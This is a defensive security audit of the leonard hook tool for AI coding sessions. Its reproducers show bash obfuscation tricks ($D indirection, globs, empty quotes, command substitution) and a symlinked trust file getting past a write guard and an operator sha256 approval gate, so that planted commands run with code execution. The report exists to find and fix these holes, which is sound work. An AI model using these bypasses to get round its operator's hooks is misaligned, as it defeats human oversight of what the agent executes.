# Bug Hunt #9 — fix verification + security review (iteration 3, post v0.51.0)

> Lane: **verify-iteration + security pass combined**. Investigation-only — no code changes.
>
> Date: 2026-05-20
> Codebase: HEAD @ `3738fa2` (v0.51.0)
> Method: per-iteration-2-closure reproducers, then aggressive probe for new HIGH/CRIT findings.
> Scratch in `/tmp/bh9-*`.

---

## Headline

**CONTINUE — three findings (2 CRITICAL, 1 HIGH).**

The v0.51 trust-gate redesign is the right architectural choice in principle — moving authorization from "is the bash command lexically safe?" (impossible) to "did the operator sha256-approve the command?" — **but the implementation leaves the trust file and the bash `.leonard/` write guard mutually fatal**:

1. The bash lexical scanner still has the bughunt-8 obfuscation bypasses (`$D` variable indirection, glob `.l?onard`, empty-quote `.l''eonard`, command substitution `.l$(echo eonard)`, etc.). v0.51 chose not to fix these because the trust gate was supposed to make them harmless.
2. **The trust gate is not harmless** — its fingerprint file is operator-writable via `os.WriteFile(0600)`, NOT operator-authored-only. An attacker who can write under `.leonard/` (which the bash obfuscation bypasses still allow) can write BOTH the malicious `config.toml` AND a matching fingerprint, and the post-edit hook will dutifully execute.
3. The trust file is also read via `os.ReadFile` which follows symlinks, so an alternate attack lands a symlink at `.leonard/trusted-verifier.sha256 → /tmp/attacker-hash`.

End-to-end RCE chain reproduced both ways — same primitive as bughunt-7 / bughunt-8 / sec-2 / sec-3 / sec-4, only the bypass shape changed.

Separately, the v0.51 WAL-checkpoint-at-Close fix (intended to close bughunt-8 F6) is **dead code** — `realBackend.Indexer()` and `realBackend.Claims()` open the store but the post-edit / session-start / stop hooks never invoke `Store.Close()`. Measured: WAL grows ~21 KB per hook, hitting 15 MB at 700 hooks (vs the bughunt-8 v0.50.2 measurement of 4.15 MB, and the v0.51 expectation of "near-zero").

The other iteration-2 closures hold:

| Iteration-2 fix | Status at v0.51.0 |
|---|---|
| Trust gate refuses untrusted command (probe #1) | **HOLDS** (untrusted echo not executed) |
| `leonard config trust --yes` writes 0o600 fingerprint (probe #2) | **HOLDS** (verified sha256 byte-for-byte) |
| Trust drift refusal after config edit (probe #3) | **HOLDS** (stderr "UNTRUSTED" emitted, falls back to go-vet) |
| `.leonard` symlink rejection at init (probe #4) | **HOLDS** (`is a symlink; refusing to initialize`) |
| WAL checkpoint at Close (probe #5) | **BROKEN** — see F2 below |
| Walk-up O(n²) DoS fixed (probe #6) | **HOLDS** (4000 segments in 113ms) |
| `store.ListFiles` LIMIT 1000 (probe #7) | **HOLDS** (5000 inserted, 1000 returned) |

---

## Findings

### F1 — CRITICAL: trust gate is bypassable via the same bash obfuscation class it was supposed to defeat → end-to-end RCE

- **Severity:** critical
- **Where:** `internal/config/trust.go:80-86` (`WriteTrustedFingerprint` writes via plain `os.WriteFile` to a path that lives inside `.leonard/`), combined with the unchanged `bashTouchesLeonardDir` in `internal/hooks/pre_edit.go:651-684`.
- **Reproducer:** end-to-end, no shell tricks beyond a single `$D=.leonard` variable assignment that the pre-edit lexical scanner does not catch:
  ```bash
  mkdir -p /tmp/bh9-direct && cd /tmp/bh9-direct
  leonard init .

  ATTACKER_CMD='echo DIRECT_PWNED > /tmp/direct-pwned.txt'
  ATTACKER_FP=$(printf '%s' "$ATTACKER_CMD" | shasum -a 256 | awk '{print $1}')

  # Step 1: write the matching fingerprint into .leonard/trusted-verifier.sha256.
  #   The pre-edit hook is consulted on the Bash tool. The literal string
  #   `D=.leonard; echo $FP > $D/trusted-verifier.sha256` does NOT contain the
  #   substring `.leonard/` or `.leonard\` so `bashTouchesLeonardDir` returns
  #   false and the hook returns {"continue":true}.
  printf '%s\n' '{"session_id":"s","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"D=.leonard; echo '"$ATTACKER_FP"' > $D/trusted-verifier.sha256"},"cwd":"/tmp/bh9-direct"}' \
    | leonard-hook pre-edit
  # → {"continue":true}
  bash -c "D=.leonard; echo $ATTACKER_FP > \$D/trusted-verifier.sha256"

  # Step 2: write the malicious command into .leonard/config.toml the same way.
  printf '%s\n' '{"session_id":"s","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"D=.leonard; tee $D/config.toml"},"cwd":"/tmp/bh9-direct"}' \
    | leonard-hook pre-edit
  # → {"continue":true}
  bash -c 'D=.leonard; cat > $D/config.toml <<EOF
  [post_edit.verify]
  command = "echo DIRECT_PWNED > /tmp/direct-pwned.txt"
  EOF'

  # Step 3: trigger a post-edit hook (a normal Edit/Write Claude makes will do).
  echo 'package main' > foo.go
  printf '%s' '{"session_id":"s","hook_event_name":"PostToolUse","tool_name":"Edit","tool_input":{"file_path":"/tmp/bh9-direct/foo.go"},"tool_response":{"success":true},"cwd":"/tmp/bh9-direct"}' \
    | leonard-hook post-edit
  # → {"continue":true,"systemMessage":"leonard: re-indexed /tmp/bh9-direct/foo.go, echo DIRECT_PWNED ok"}

  ls -la /tmp/direct-pwned.txt
  # → file exists with "DIRECT_PWNED" content
  ```
- **Why iteration 2's redesign doesn't help:** the v0.51 SECURITY.md and trust.go header both reason about "an attacker who lands a malicious command in `.leonard/config.toml`" and argue that the fingerprint mismatch saves us. But the same primitive that lets an attacker land config.toml *also* lets them land the matching `.leonard/trusted-verifier.sha256`. The two files share the same `.leonard/` parent directory and the same write-guard. The bughunt-8 audit enumerated four distinct bash quote-removal / expansion classes that bypass `bashTouchesLeonardDir`; the v0.51 changelog explicitly says "enumerating bypasses is futile" (and that's right), but the trust gate moved the goalpost from "block one file write" to "block two file writes" *using the same scanner that already can't block one*.
- **Bypasses verified at v0.51.0** (pre-edit hook returns `{"continue":true}` for every one):
  - Variable indirection: `D=.leonard; echo X > $D/trusted-verifier.sha256`
  - Glob: `echo X > .l?onard/trusted-verifier.sha256`
  - Empty quotes: `echo X > .l''eonard/trusted-verifier.sha256`
  - `tee`: `D=.leonard; tee $D/trusted-verifier.sha256`
  - Command substitution: `echo X > .l$(echo eonard)/trusted-verifier.sha256`
  - All of bughunt-8's F1-F5 backslash / ANSI-C / param-expansion forms (still unfixed).
- **Suggested fix shape (pick one or stack):**
  1. **Make `.leonard/` write-protected at the OS layer**, not at the bash-string layer. The hook can't reliably parse bash; the OS can reliably refuse the write. Options: chmod 0500 on `.leonard/` (operator runs `leonard config trust` via a setuid helper or via a wrapper that briefly chmods +w), or move the trust file outside the project entirely (e.g. `~/.config/leonard/trust/<project-hash>.sha256` like `~/.gitconfig`-style).
  2. **Replace the lexical bash scanner with `github.com/mvdan/sh/syntax`** and walk the AST for any redirect / pipe / exec target containing `.leonard`. This is what bughunt-8 suggested and v0.51 chose to skip — but the trust gate doesn't actually substitute for it.
  3. **Sign the trust file** with a key that lives outside `.leonard/` (e.g. a per-user keypair under `~/.config/leonard/`). The post-edit hook verifies both the command fingerprint AND a signature over it. An attacker who can write `.leonard/` can't forge the signature.
- **Out of scope for this finding:** the trust file as a *symlink* (separate finding below). That gives the same RCE through a slightly different door.

### F2 — CRITICAL: trust file is followed through symlinks → orthogonal RCE path

- **Severity:** critical
- **Where:** `internal/config/trust.go:67` (`os.ReadFile(path)` — no `Lstat` check, follows symlinks).
- **Reproducer:**
  ```bash
  mkdir -p /tmp/bh9-trustsym && cd /tmp/bh9-trustsym
  leonard init .

  ATTACKER_CMD='echo PWNED > /tmp/symlink-pwned.txt'
  ATTACKER_FP=$(printf '%s' "$ATTACKER_CMD" | shasum -a 256 | awk '{print $1}')
  echo "$ATTACKER_FP" > /tmp/attacker-hash

  # Symlink the trust file at the attacker's hash.
  ln -sf /tmp/attacker-hash .leonard/trusted-verifier.sha256

  # Plant the command in config.toml (in this proof we use direct file ops;
  # via Bash this also bypasses pre-edit via F1's $D obfuscation).
  cat > .leonard/config.toml <<EOF
  [post_edit.verify]
  command = "$ATTACKER_CMD"
  EOF

  printf '%s' '{"session_id":"s","hook_event_name":"PostToolUse","tool_name":"Edit","tool_input":{"file_path":"/tmp/bh9-trustsym/foo.go"},"tool_response":{"success":true},"cwd":"/tmp/bh9-trustsym"}' \
    | leonard-hook post-edit
  # → systemMessage: "leonard: re-indexed ..., echo PWNED ok"

  ls /tmp/symlink-pwned.txt   # exists
  ```
- **Why this matters even with the .leonard/ guard:**
  - `ln -s /tmp/attacker-hash .leonard/trusted-verifier.sha256` *with the literal `.leonard` in the command* IS caught by the lexical scanner — but the bughunt-8 F1-F5 obfuscation class (`D=.leonard; ln -s /tmp/attacker-hash $D/trusted-verifier.sha256`) is not. Verified.
  - There's also the broader cross-project / shared-checkout class: sec-3 F8 noted a `.leonard` symlink across projects can be planted by an attacker-controlled checkout (e.g. a malicious clone with `.leonard/` pre-populated). The init-time `Lstat` check catches the directory-as-symlink case (good, verified at v0.51) but does NOT inspect children of `.leonard/`.
- **Suggested fix shape:** in `ReadTrustedFingerprint`, `os.Lstat` the file first and refuse to read if `info.Mode()&os.ModeSymlink != 0` — mirror the v0.51 `leonard init` defense. Also `os.Lstat` the parent `.leonard/` directory at each post-edit invocation, not just at init, since `init` runs once and the symlink can be swapped in afterward.

### F3 — HIGH: post-edit / session-start / stop hooks never call `Store.Close()` → WAL checkpoint fix is dead code → WAL grows unbounded

- **Severity:** high
- **Where:**
  - `cmd/leonard-hook/backend_real.go:17-25`: `realBackend.Indexer` and `realBackend.Claims` each call `mustOpenStore` and return the adapter — no `Close` exposed to the caller. `realBackend.Close()` (line 27) returns `nil`.
  - `cmd/leonard-hook/post_edit.go`: no `.Close()` or `defer` anywhere.
  - `cmd/leonard-hook/session_start.go`: no `.Close()` or `defer` anywhere.
  - `cmd/leonard-hook/stop.go`: no `.Close()` or `defer` anywhere.
  - Only `cmd/leonard-hook/pre_edit.go:72` correctly wires `s.Close` as the closer return.
- **Why the v0.51 fix doesn't fire:** v0.51 added `_, _ = s.db.Exec("PRAGMA wal_checkpoint(PASSIVE)")` to `internal/store/store.go:150` in `Store.Close()`. The intent (per the comment block) was that "each new hook-process opens a fresh connection, so the frame counter resets and the WAL grows unbounded across sessions of short-lived processes" — the fix is to checkpoint at Close. But Close is never reached for three of the four hooks.
- **Empirical measurement (clean DB, single edit target file):**

  | Hooks executed | WAL size | DB size |
  |---|---|---|
  | 50 | 1,046,512 B (1.05 MB) | 151,552 B |
  | 100 | 2,130,072 B (2.13 MB) | 77,824 B |
  | 300 | 6,402,512 B (6.4 MB) | 151,552 B |
  | 700 | 15,038,032 B (15.0 MB) | 262,144 B |

  Linear growth at ~21 KB per hook. After an external `sqlite3 ... 'PRAGMA wal_checkpoint(PASSIVE);'` the WAL drops to 0, confirming the data is checkpointable but the in-process call never runs.

  For comparison, the bughunt-8 measurement at v0.50.2 was 4.15 MB at 700 hooks. The v0.51 audit goal was "near-zero at v0.51". Actual at v0.51 is **15 MB at 700 hooks — 3.6× worse than the v0.50.2 baseline**, because v0.51 did nothing useful (the fix is unreachable) AND something else in the v0.51 changes appears to have increased per-hook frame writes. Possibly the new config load + trust file read add page-cache touches; not investigated further since the headline finding is the dead Close path.

- **Suggested fix shape:**
  1. **Cleanest:** make `realBackend` track the stores it opens and add a real `Close()` method; hook each cobra `RunE` to call it as `defer`. This also fixes the design smell where post-edit opens TWO sqlite connections per hook (one in `Indexer()`, one in `Claims()`) which doubles the page-cache pressure AND doubles the missed-checkpoint penalty.
  2. **Stopgap (minimal change):** swap `PRAGMA wal_checkpoint(PASSIVE)` → `PRAGMA wal_checkpoint(TRUNCATE)` AND move the call from `Store.Close()` to immediately after the last write in `HandlePostEdit` (so it runs even when Close is never called). TRUNCATE forces the WAL file to shrink to 0, not just write back pages.
- **Severity rationale:** HIGH not CRITICAL because (a) the WAL still gets reclaimed eventually when the process is restarted and a new connection runs autocheckpoint+truncate, and (b) the 15 MB ceiling is recoverable disk usage, not RCE. But the v0.51 changelog explicitly claims this fix as "5 CRIT + 3 HIGH" closed; one of those HIGHs is bughunt-8 F6 and it is NOT closed. The fix-loop termination condition is "zero HIGH or CRITICAL", so this remains HIGH.

---

## Probes that came up empty (documented for the next iteration)

- **Probe 8 (trust file symlink):** confirmed exploitable — see F2.
- **Probe 9 (TOCTOU on fingerprint check vs exec):** no real race. The trust check reads the file then `MakeShellRunner` captures the command string by value; the command itself is whatever was in config.toml at config-load time, not re-read.
- **Probe 11 (direct bash write to `.leonard/trusted-verifier.sha256`):** lexical scanner catches the literal form but not the bughunt-8 obfuscation class. Verified — see F1 reproducer.
- **Probe 14 (`leonard config trust --yes` invoked by Claude via Bash):** technically allowed (the literal `leonard config trust --yes` does not contain `.leonard/`), but it can't authorize anything Claude couldn't already authorize through F1's primitive, because the config the attacker wants to authorize must first land in `.leonard/config.toml`. The trust subcommand itself is therefore not an independent attack surface — it's redundant with F1.
- **Probe 15 (argv leak in cobra version/help):** clean. `--help` shows the trust subcommand and its description without echoing config values; `--version` is the static version string.
- **Probe 16 (trust file read on hot path):** one `os.ReadFile` per post-edit hook on a small file. Negligible cost. Acceptable.
- **Probe 18 (`Fscanln` whitespace-token confirmation):** confirmed — `fmt.Fscanln(&response)` reads up to the first whitespace, so typing `yes please` succeeds as `yes`. Documented behavior, not exploitable in any meaningful sense (the operator is already at an interactive prompt; they consented).
- **Probe 19 (`config trust --yes` with empty command):** rejected with "nothing to authorize". Verified.
- **Probe 20 (concurrent `config trust` racing):** last-writer-wins on `os.WriteFile`. Both racers wrote the same fingerprint (operator on the same config), so the race is benign in the documented use case.

---

## Termination criterion

**CONTINUE — 2 CRITICAL + 1 HIGH findings remain.**

- F1 (CRIT) — trust gate bypassable via the bash-obfuscation class the v0.51 redesign was supposed to obsolete; full RCE chain reproduced.
- F2 (CRIT) — trust file followed through symlinks; orthogonal RCE chain reproduced.
- F3 (HIGH) — WAL checkpoint at Close is dead code; three hooks never reach it; WAL grows 3.6× worse than the v0.50.2 baseline the v0.51 fix was supposed to beat.

The user's termination condition (zero HIGH or CRITICAL) is not met. v0.52 should close these. The cheapest fixes:

1. **F1 + F2 together:** `os.Lstat` the trust file (refuse symlinks); move the trust file to `~/.config/leonard/trust/<project-hash>.sha256` so it's outside the `.leonard/` write surface entirely; OR sign the trust file with a key that lives outside `.leonard/`. Don't trust `.leonard/` to be untamperable just because the bash lexical scanner is *almost* good enough.
2. **F3:** add a real Close path to the three hooks (defer on the cobra RunE), and switch the checkpoint pragma to `TRUNCATE`. ~10 lines.

After those land, the fix-loop can attempt iteration 4 with a reasonable expectation of termination — but the *root cause* of F1 (lexical bash scanning is wrong) will still be there. The trust-gate design only works if the trust file lives somewhere the bash scanner doesn't need to defend.
